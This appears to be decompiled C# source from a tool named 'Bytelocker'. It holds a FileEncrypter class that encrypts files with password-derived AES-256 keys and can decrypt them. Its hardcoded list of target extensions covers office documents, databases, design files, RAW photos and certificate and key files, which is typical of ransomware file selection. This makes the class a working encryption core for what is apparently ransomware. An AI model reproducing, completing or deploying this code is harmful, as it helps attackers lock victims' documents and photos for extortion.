using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Bytelocker.CryptoManager;

internal class FileEncrypter : PasswordManager
{
	private const int AES_KEYSIZE = 256;

	private const int WRITE_BUFFER = 1048576;

	private const int AES_BLOCK_SIZE = 128;

	private const PaddingMode AES_PADDING_MODE = PaddingMode.PKCS7;

	private const CipherMode CIPHER_MODE = CipherMode.CFB;

	public static string FILE_EXTENSION_ENCRYPT_TMP = ".bytcrypttmp";

	public static List<string> FILE_EXTENSIONS_TO_ENCRYPT = new List<string>
	{
		".odt", ".ods", ".odp", ".odm", ".odc", ".odb", ".doc", ".docx", ".docm", ".wps",
		".xls", ".xlsx", ".xlsm", ".xlsb", ".xlk", ".ppt", ".pptx", ".pptm", ".mdb", ".accdb",
		".pst", ".dwg", ".dxf", ".dxg", ".wpd", ".rtf", ".wb2", ".mdf", ".dbf", ".psd",
		".pdd", ".pdf", ".eps", ".ai", ".indd", ".cdr", ".jpg", ".jpe", ".jpg", ".dng",
		".3fr", ".arw", ".srf", ".sr2", ".bay", ".crw", ".cr2", ".dcr", ".kdc", ".erf",
		".mef", ".mrw", ".nef", ".nrw", ".orf", ".raf", ".raw", ".rwl", ".rw2", ".r3d",
		".ptx", ".pef", ".srw", ".x3f", ".der", ".cer", ".crt", ".pem", ".pfx", ".p12",
		".p7b", ".p7c"
	};

	private string file_path;

	private byte[] salt;

	public void ChooseFile(string file_path)
	{
		this.file_path = file_path;
	}

	public void GenerateRandomSalt()
	{
		Aes aes = new Aes();
		salt = aes.GenerateRandomSalt();
	}

	public void Encrypt()
	{
		FileStream fileStream = new FileStream(file_path + FILE_EXTENSION_ENCRYPT_TMP, FileMode.Create);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Encoding.UTF8.GetBytes(password), salt, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(salt, 0, salt.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(file_path, FileMode.Open);
		byte[] array = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array, 0, array.Length)) > 0)
			{
				cryptoStream.Write(array, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			cryptoStream.Close();
			fileStream.Close();
		}
	}

	public void Decrypt()
	{
		FileStream fileStream = new FileStream(file_path, FileMode.Open);
		fileStream.Read(salt, 0, salt.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Encoding.UTF8.GetBytes(password), salt, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CFB;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(file_path + FILE_EXTENSION_ENCRYPT_TMP, FileMode.Create);
		byte[] array = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array, 0, array.Length)) > 0)
			{
				fileStream2.Write(array, 0, count);
			}
			cryptoStream.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}
}
